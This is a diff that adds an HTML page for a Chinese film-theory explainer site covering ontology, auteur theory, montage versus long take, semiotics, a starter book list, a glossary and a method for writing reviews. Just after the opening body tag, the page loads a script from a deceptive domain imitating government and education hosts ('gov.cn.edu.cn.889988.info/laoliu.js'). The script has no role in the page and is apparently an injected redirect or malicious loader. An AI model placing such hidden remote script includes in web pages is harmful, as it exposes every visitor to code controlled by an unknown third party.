@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>秋霞电影网·理论 - 电影本体论/作者论/蒙太奇/符号学 大众化讲义</title>
+<meta name="description" content="秋霞电影网·理论(qiuxiadianyingwanglilun-h5.github.io)把电影理论讲给影迷听：电影是什么、作者论、蒙太奇、长镜头、电影符号学、叙事学、类型片、精神分析与女性主义批评。纯理论/影评知识站，不提供盗版播放。">
+<meta name="keywords" content="秋霞电影网理论, qiuxiadianyingwanglilun-h5, 电影理论, 作者论, 蒙太奇, 电影符号学, 电影叙事学, 类型电影, 女性主义电影理论">
+<meta name="author" content="秋霞电影网·理论">
+<meta name="robots" content="index, follow">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --maple:#9c3b1b;
+  --maple-soft:#c0582f;
+  --paper:#fbf6ec;
+  --paper-2:#f3e9d6;
+  --ink:#33271c;
+  --ink-soft:#6f5b46;
+  --green:#3f5d3a;
+  --line:rgba(156,59,27,0.16);
+  --card:#fffdf8;
+  --shadow:0 6px 20px rgba(156,59,27,0.12);
+  --shadow-lg:0 16px 42px rgba(156,59,27,0.18);
+  --radius:18px;
+}
+html{scroll-behavior:smooth}
+body{font-family:"Noto Serif SC","Songti SC","PingFang SC",serif;background:var(--paper);color:var(--ink);line-height:1.85;overflow-x:hidden}
+.paper-bg{position:fixed;inset:0;z-index:0;pointer-events:none;background:
+  radial-gradient(420px 420px at 10% 12%,rgba(192,88,47,.10),transparent 60%),
+  radial-gradient(380px 380px at 90% 20%,rgba(63,93,58,.08),transparent 60%),
+  linear-gradient(180deg,#fbf6ec,#f3e9d6);}
+.leaf{position:fixed;top:-20px;font-size:18px;opacity:.5;z-index:0;animation:fall 11s linear infinite}
+@keyframes fall{0%{transform:translateY(-10vh) rotate(0)}100%{transform:translateY(115vh) rotate(360deg)}}
+
+.topbar{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(251,246,236,.92);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.topbar-inner{max-width:1200px;margin:0 auto;padding:0 20px;height:60px;display:flex;align-items:center;justify-content:space-between}
+.brand{display:flex;align-items:center;gap:10px;font-weight:800;font-size:1.12rem}
+.brand .seal{width:34px;height:34px;border-radius:8px;background:linear-gradient(135deg,var(--maple),var(--maple-soft));color:#fff;display:flex;align-items:center;justify-content:center;font-family:serif}
+.brand b{color:var(--maple)}
+.topnav{display:flex;gap:4px}
+.topnav a{padding:8px 14px;border-radius:8px;font-size:.84rem;font-weight:600;color:var(--ink-soft);transition:.25s}
+.topnav a:hover,.topnav a.active{background:rgba(156,59,27,.1);color:var(--maple)}
+.menu-btn{display:none;background:none;border:none;font-size:1.4rem;color:var(--maple);cursor:pointer}
+
+.hero{position:relative;z-index:1;margin-top:60px;padding:74px 20px 54px}
+.hero-inner{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:1.1fr .9fr;gap:40px;align-items:center}
+.kicker{font-family:"Courier New",monospace;font-size:.68rem;letter-spacing:3px;color:var(--maple);border:1px solid var(--line);padding:4px 10px;border-radius:20px}
+.hero h1{font-size:clamp(1.9rem,4vw,3rem);font-weight:900;line-height:1.18;margin:14px 0 8px}
+.hero h1 .ul{border-bottom:4px double var(--maple-soft)}
+.hero p{color:var(--ink-soft);font-size:1rem;margin:14px 0 24px}
+.hero-actions{display:flex;gap:14px;flex-wrap:wrap}
+.btn{font-family:inherit;font-weight:700;font-size:.9rem;padding:12px 24px;border-radius:10px;cursor:pointer;border:none;transition:.3s}
+.btn-main{background:linear-gradient(135deg,var(--maple),var(--maple-soft));color:#fff}
+.btn-main:hover{transform:translateY(-2px);box-shadow:var(--shadow-lg)}
+.btn-line{background:transparent;border:2px solid var(--maple);color:var(--maple)}
+.hero-card{background:var(--card);border:1px solid var(--line);border-radius:20px;padding:24px;box-shadow:var(--shadow-lg)}
+.hero-card h3{font-size:.95rem;margin-bottom:10px;color:var(--maple)}
+.hero-card p{font-size:.78rem;color:var(--ink-soft);line-height:1.65}
+.hero-card .dot{color:var(--green);font-weight:800}
+
+.container{max-width:1200px;margin:0 auto;padding:52px 20px;position:relative;z-index:1}
+.label{font-family:"Courier New",monospace;font-size:.65rem;letter-spacing:3px;text-transform:uppercase;color:var(--maple)}
+.title{font-size:clamp(1.3rem,3vw,1.8rem);font-weight:800;margin:4px 0 6px}
+.desc{font-size:.88rem;color:var(--ink-soft);margin-bottom:30px}
+
+/* 理论地图 */
+.map-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:20px}
+.theory{background:var(--card);border-radius:var(--radius);padding:22px;box-shadow:var(--shadow);border-top:4px solid var(--maple-soft);transition:.3s}
+.theory:hover{transform:translateY(-4px);box-shadow:var(--shadow-lg)}
+.theory .no{font-family:Georgia,serif;font-size:1.4rem;color:var(--maple);font-weight:900}
+.theory h3{font-size:1rem;font-weight:800;margin:6px 0 6px}
+.theory p{font-size:.76rem;color:var(--ink-soft);line-height:1.6}
+.theory .who{margin-top:8px;font-size:.72rem;color:var(--green);font-weight:600}
+
+/* 蒙太奇 vs 长镜头 */
+.debate{background:rgba(192,88,47,.06)}
+.cols{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+.col{background:var(--card);border-radius:var(--radius);padding:24px;box-shadow:var(--shadow);border:1px solid var(--line)}
+.col h3{font-size:1rem;font-weight:800;color:var(--maple);margin-bottom:8px}
+.col p{font-size:.78rem;color:var(--ink-soft);line-height:1.7}
+.col ul{margin:10px 0 0 18px;font-size:.78rem;color:var(--ink-soft)}
+.tag-row{margin-top:12px;display:flex;gap:8px;flex-wrap:wrap}
+.tag{font-size:.66rem;padding:3px 9px;border-radius:20px;background:rgba(63,93,58,.12);color:var(--green);font-weight:600}
+
+/* 读书卡片 */
+.read-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:20px}
+.book{background:var(--card);border-radius:var(--radius);padding:20px;box-shadow:var(--shadow);display:flex;gap:14px;transition:.3s}
+.book:hover{transform:translateX(4px)}
+.book .spine{width:8px;border-radius:6px;background:linear-gradient(var(--maple),var(--green))}
+.book h4{font-size:.92rem;font-weight:800}
+.book p{font-size:.74rem;color:var(--ink-soft);margin-top:4px}
+
+/* 术语表 */
+.gloss{background:rgba(63,93,58,.05)}
+.term{display:grid;grid-template-columns:180px 1fr;gap:16px;background:var(--card);border-radius:14px;padding:16px 20px;box-shadow:var(--shadow);margin-bottom:12px}
+.term b{color:var(--maple);font-size:.9rem}
+.term p{font-size:.78rem;color:var(--ink-soft)}
+
+/* 分析方法 */
+.method-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:18px}
+.method{background:var(--card);border-radius:14px;padding:22px;box-shadow:var(--shadow);border-left:4px solid var(--green)}
+.method h3{font-size:.92rem;font-weight:800;margin-bottom:6px}
+.method p{font-size:.76rem;color:var(--ink-soft);line-height:1.65}
+.method .q{margin-top:8px;font-size:.74rem;font-style:italic;color:var(--maple)}
+
+.footer{position:relative;z-index:1;background:var(--ink);color:var(--paper);padding:46px 20px 24px;margin-top:54px}
+.footer-inner{max-width:1200px;margin:0 auto}
+.footer-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:34px;margin-bottom:26px}
+.footer h4{font-size:.9rem;margin-bottom:10px}
+.footer a{display:block;font-size:.8rem;color:rgba(251,246,236,.65);padding:3px 0}
+.footer a:hover{color:var(--maple-soft)}
+.footer p{font-size:.82rem;color:rgba(251,246,236,.72);line-height:1.6}
+.footer-bottom{text-align:center;font-size:.72rem;color:rgba(251,246,236,.5);padding-top:18px;border-top:1px solid rgba(251,246,236,.15)}
+.footer-bottom a{color:var(--maple-soft);font-weight:600;display:inline}
+
+@media(max-width:1024px){.hero-inner{grid-template-columns:1fr}.hero-card{order:-1}.cols{grid-template-columns:1fr}}
+@media(max-width:768px){
+  .topnav{display:none;position:absolute;top:60px;left:0;right:0;flex-direction:column;background:rgba(251,246,236,.97);padding:12px 20px;border-bottom:1px solid var(--line)}
+  .topnav.open{display:flex}.menu-btn{display:block}
+  .term{grid-template-columns:1fr}.footer-grid{grid-template-columns:1fr 1fr}
+}
+@media(max-width:480px){.footer-grid{grid-template-columns:1fr}.hero h1{font-size:1.65rem}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+<div class="paper-bg"></div>
+<script>
+for(var i=0;i<10;i++){var s=document.createElement('div');s.className='leaf';s.textContent='🍁';
+s.style.left=Math.random()*100+'vw';s.style.animationDuration=(8+Math.random()*7)+'s';
+s.style.animationDelay=(-Math.random()*8)+'s';document.body.appendChild(s);}
+</script>
+
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="brand"><span class="seal">秋</span>秋霞电影网<b>·理论</b></div>
+    <nav class="topnav" id="topNav">
+      <a href="#home" class="active">首页</a>
+      <a href="#map">理论地图</a>
+      <a href="#montage">蒙太奇/长镜头</a>
+      <a href="#read">入门书单</a>
+      <a href="#gloss">术语表</a>
+      <a href="#method">怎么分析</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn">☰</button>
+  </div>
+</div>
+
+<section class="hero" id="home">
+  <div class="hero-inner">
+    <div>
+      <span class="kicker">FILM THEORY FOR FANS</span>
+      <h1>不是“看不懂”，<br>是没人把<span class="ul">电影理论</span>讲成人话。</h1>
+      <p>秋霞电影网·理论（qiuxiadianyingwanglilun-h5.github.io）把学院里的电影理论拆成影迷能用的工具：电影是什么、谁才是作者、一个剪辑为什么让你心跳、银幕怎么变成镜子。</p>
+      <div class="hero-actions">
+        <button class="btn btn-main">📖 打开理论地图</button>
+        <button class="btn btn-line">🎞️ 蒙太奇 vs 长镜头</button>
+      </div>
+    </div>
+    <div class="hero-card">
+      <h3>本站定位</h3>
+      <p><span class="dot">✓</span> 电影理论 / 影评方法 / 文本分析站<br>
+      <span class="dot">✓</span> 不提供盗版播放、不挂假播放器<br>
+      <span class="dot">✓</span> 不蹭软色情，只谈镜头与意义<br>
+      <span class="dot">✓</span 适合影迷 / 考研人 / 短视频影评号</p>
+    </div>
+  </div>
+</section>
+
+<div class="container" id="map">
+  <div class="label">— THEORY MAP —</div>
+  <h2 class="title">电影理论九张地图</h2>
+  <p class="desc">从“电影是不是艺术”到“银幕是不是镜子”，一条线串起来。</p>
+  <div class="map-grid">
+    <div class="theory"><div class="no">01</div><h3>电影本体论</h3><p>巴赞说电影是“物质现实的复原”，克拉考尔要电影拍出“风吹树叶”的偶然。</p><div class="who">巴赞 / 克拉考尔</div></div>
+    <div class="theory"><div class="no">02</div><h3>作者论</h3><p>特吕弗把导演当作家：即使工业流水线，也能读出个人签名。</p><div class="who">特吕弗 / 萨里斯</div></div>
+    <div class="theory"><div class="no">03</div><h3>蒙太奇学派</h3><p>库里肖夫效应、爱森斯坦的理性蒙太奇：两个镜头撞在一起，意义会爆炸。</p><div class="who">爱森斯坦 / 普多夫金</div></div>
+    <div class="theory"><div class="no">04</div><h3>长镜头与场面调度</h3><p>不剪，让时间和空间自己长出来；巴赞眼中的“真实”藏在景深里。</p><div class="who">巴赞 / 威尔斯 / 小津</div></div>
+    <div class="theory"><div class="no">05</div><h3>电影符号学</h3><p>麦茨问：电影是不是语言？影像、声音、剪辑都是能指，观众在解码。</p><div class="who">麦茨 / 第一、第二符号学</div></div>
+    <div class="theory"><div class="no">06</div><h3>叙事学</h3><p>谁在讲、讲什么、什么时候讲、从哪只眼睛讲——故事是结构出来的。</p><div class="who">普罗普 / 热奈特</div></div>
+    <div class="theory"><div class="no">07</div><h3>精神分析</h3><p>银幕=镜子，电影=梦。拉康的“镜像阶段”解释你为什么在黑暗里忘了自己。</p><div class="who">弗洛伊德 / 拉康 / 鲍德里</div></div>
+    <div class="theory"><div class="no">08</div><h3>女性主义批评</h3><p>劳拉·穆尔维提出“男性凝视”：摄影机、男主、观众三代都在看她。</p><div class="who">穆尔维 / 女性主义电影理论</div></div>
+    <div class="theory"><div class="no">09</div><h3>意识形态批评</h3><p>电影不只讲故事，还在把某种“世界本来如此”悄悄自然化。</p><div class="who">阿尔都塞 / 电影手册派</div></div>
+  </div>
+</div>
+
+<div class="container debate" id="montage">
+  <div class="label">— MONTAGE VS LONG TAKE —</div>
+  <h2 class="title">蒙太奇 和 长镜头，不是在吵架，是在抢“时间”</h2>
+  <p class="desc">一个相信“剪出来的人生”，一个相信“不剪才诚实”。</p>
+  <div class="cols">
+    <div class="col">
+      <h3>✂️ 蒙太奇：意义是撞出来的</h3>
+      <p>单个镜头可能平淡，但 A+B 会生成 C——子弹+婴儿=暴力与无辜的冲突。</p>
+      <ul>
+        <li>库里肖夫：同一张脸，配汤/棺材/小孩，观众读出饿/悲伤/温柔</li>
+        <li>爱森斯坦：镜头冲突像阶级斗争，理性蒙太奇直接灌理念</li>
+        <li>格里菲斯：平行剪辑把“最后一分钟营救”变成心跳</li>
+      </ul>
+      <div class="tag-row"><span class="tag">剪辑即思想</span><span class="tag">冲突</span><span class="tag">节奏</span></div>
+    </div>
+    <div class="col">
+      <h3>🎥 长镜头：意义是长出来的</h3>
+      <p>不切，让演员、空间、声音在真实时间里互相挤压，观众自己选看哪儿。</p>
+      <ul>
+        <li>巴赞：景深镜头把“判断权”还给观众</li>
+        <li>《俄罗斯方舟》一镜到底：时间不被切碎，历史像散步</li>
+        <li>侯孝贤 / 是枝裕和：把“没事发生”拍成大事</li>
+      </ul>
+      <div class="tag-row"><span class="tag">实时</span><span class="tag">场面调度</span><span class="tag">暧昧</span></div>
+    </div>
+  </div>
+</div>
+
+<div class="container" id="read">
+  <div class="label">— STARTER SHELF —</div>
+  <h2 class="title">影迷入门书单（不劝退版）</h2>
+  <p class="desc">先读“会写人话”的，再啃麦茨。</p>
+  <div class="read-grid">
+    <div class="book"><div class="spine"></div><div><h4>《电影是什么》</h4><p>巴赞文集。读懂“写实派”的圣经，语言比你想的顺。</p></div></div>
+    <div class="book"><div class="spine"></div><div><h4>《电影艺术：形式与风格》</h4><p>波德维尔写给普通人的教科书，术语有例子，适合搭骨架。</p></div></div>
+    <div class="book"><div class="spine"></div><div><h4>《电影理论导论》</h4><p>罗伯特·斯塔姆，从本体论到后殖民，一张地图走全。</p></div></div>
+    <div class="book"><div class="spine"></div><div><h4>《视觉快感与叙事性电影》</h4><p>穆尔维名文。短，但会改变你“看被看”的方式。</p></div></div>
+    <div class="book"><div class="spine"></div><div><h4>《电影理论基础》</h4><p>陈晓云版，华语语境里讲作者论、符号学、类型片很顺。</p></div></div>
+    <div class="book"><div class="spine"></div><div><h4>《镜与灯》/《影视批评》讲义</h4><p>先读批评范式，再回来看片，影评一下就有学术味。</p></div></div>
+  </div>
+</div>
+
+<div class="container gloss" id="gloss">
+  <div class="label">— MINI GLOSSARY —</div>
+  <h2 class="title">影评里总出现的词，到底啥意思</h2>
+  <p class="desc">写短视频文案、发豆瓣、做公众号都能直接用。</p>
+  <div class="term"><b>能指 / 所指</b><p>红灯是能指，“停止/危险/情欲”是所指；电影靠视听符号制造多层所指。</p></div>
+  <div class="term"><b>场面调度</b><p>演员走位、摄影机运动、布景、灯光——不靠剪，而靠“在画面里排兵布阵”。</p></div>
+  <div class="term"><b>视点镜头</b><p>摄影机替谁看？POV 一换，观众就站队；男性凝视就是从这里被拆的。</p></div>
+  <div class="term"><b>声画对位</b><p>画面笑、声音哭，意义在错位里长出来；比“声画同步”更高级。</p></div>
+  <div class="term"><b>类型惯例</b><p>西部片有荒原，黑色电影有雨夜；类型片不是套路，是一套观众懂的契约。</p></div>
+  <div class="term"><b>作者印痕</b><p>同样拍超级英雄，有人拍成童话，有人拍成葬礼——那就是作者。</p></div>
+</div>
+
+<div class="container" id="method">
+  <div class="label">— HOW TO ANALYZE —</div>
+  <h2 class="title">拿到一部片，按这 5 步写“理论影评”</h2>
+  <p class="desc">别再写“演技好、剧情炸、镜头绝”了。</p>
+  <div class="method-grid">
+    <div class="method"><h3>1. 先描述，不评价</h3><p>开场 90 秒：什么颜色、机位多高、声音从哪来、谁在画中心。</p><div class="q">“说画面，不说爽不爽。”</div></div>
+    <div class="method"><h3>2. 找形式动机</h3><p>为什么用长镜头？为什么切得碎？形式不是装饰，是立场。</p><div class="q">“剪法 = 价值观。”</div></div>
+    <div class="method"><h3>3. 套一个理论透镜</h3><p>作者论看风格、符号学看意义、女性主义看凝视、意识形态看权力。</p><div class="q">“一次只戴一副眼镜。”</div></div>
+    <div class="method"><h3>4. 回到历史语境</h3><p>1960 年拍婚外情、2020 年拍AI，观众害怕的东西不一样。</p><div class="q">“片子是时代的梦话。”</div></div>
+    <div class="method"><h3>5. 留一点暧昧</h3><p>好分析不把话说死：导演可能比理论更糊涂，也比评论家更聪明。</p><div class="q">“别把解释写成判决书。”</div></div>
+    <div class="method"><h3>＋ Bonus：做对照</h3><p>把《英雄》红林和《银翼杀手2049》霓虹放一起写，理论一下子活了。</p><div class="q">“对比，是影评的发动机。”</div></div>
+  </div>
+</div>
+
+<footer class="footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div>
+        <div class="brand"><span class="seal">秋</span>秋霞电影网<b>·理论</b></div>
+        <p>秋霞电影网·理论（qiuxiadianyingwanglilun-h5.github.io）把电影本体论、作者论、蒙太奇、符号学、叙事学、类型片与批评方法，讲成影迷能用的工具。不播盗版，不写软文。</p>
+      </div>
+      <div><h4>理论</h4><a href="#map">理论地图</a><a href="#montage">蒙太奇/长镜头</a><a href="#gloss">术语表</a><a href="#method">分析流程</a></div>
+      <div><h4>方向</h4><a href="#">作者论</a><a href="#">电影符号学</a><a href="#">女性主义批评</a><a href="#">类型电影</a></div>
+      <div><h4>说明</h4><a href="#">内容立场</a><a href="#">版权与引用</a><a href="#">隐私说明</a><a href="#">联系我们</a></div>
+    </div>
+    <div class="footer-bottom">
+      <p>© 2024 秋霞电影网·理论 (Qiuxia Film Theory) - 电影理论大众化 · 影评方法 · 文本分析</p>
+      <p>网站地址：<a href="https://qiuxiadianyingwanglilun-h5.github.io">https://qiuxiadianyingwanglilun-h5.github.io</a></p>
+      <p style="margin-top:6px;opacity:.6">影片与理论家信息来自公开学术资料；本站不提供未授权播放资源。</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+var menuBtn=document.getElementById('menuBtn'),topNav=document.getElementById('topNav');
+menuBtn.onclick=function(){topNav.classList.toggle('open')};
+topNav.querySelectorAll('a').forEach(function(a){a.onclick=function(){topNav.classList.remove('open')}});
+var secs=document.querySelectorAll('section[id],div[id]');
+addEventListener('scroll',function(){
+  var y=scrollY+80;
+  secs.forEach(function(s){
+    if(y>=s.offsetTop&&y<s.offsetTop+s.offsetHeight){
+      document.querySelectorAll('.topnav a').forEach(function(a){a.classList.remove('active')});
+      var l=document.querySelector('.topnav a[href="#'+s.id+'"]');
+      if(l)l.classList.add('active');
+    }
+  });
+});
+</script>
+</body>
+</html>
